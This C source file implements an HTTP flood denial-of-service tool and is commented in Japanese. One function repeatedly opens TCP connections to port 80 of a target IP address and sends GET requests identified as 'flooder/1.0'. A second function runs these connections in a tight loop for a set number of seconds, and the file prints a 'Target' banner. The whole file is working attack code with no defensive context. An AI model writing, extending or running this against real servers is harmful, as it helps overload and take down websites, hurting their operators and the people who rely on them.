#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include "http_flood.h"

#define HTTP_PORT 80

// HTTP GET パケットを送信
void send_http_get(const char *target) {
    int sock;
    struct sockaddr_in server;

    // 1. TCPソケット作成
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    server.sin_family = AF_INET;
    server.sin_port = htons(HTTP_PORT);
    server.sin_addr.s_addr = inet_addr(target);

    // 2. connect()
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return;
    }

    // 3. HTTP GET リクエスト生成
    char request[256];
    snprintf(request, sizeof(request),
             "GET / HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: flooder/1.0\r\n"
             "Connection: close\r\n\r\n",
             target);

    // 4. send()
    send(sock, request, strlen(request), 0);

    // 5. close()
    close(sock);
}

// Flood 本体
void http_flood(const char *target, int duration) {
    printf("[HTTP Flood] Target: %s for %d sec\n", target, duration);

    time_t start = time(NULL);

    while (time(NULL) - start < duration) {
        send_http_get(target);   // 実際に HTTP を送る
    }
}
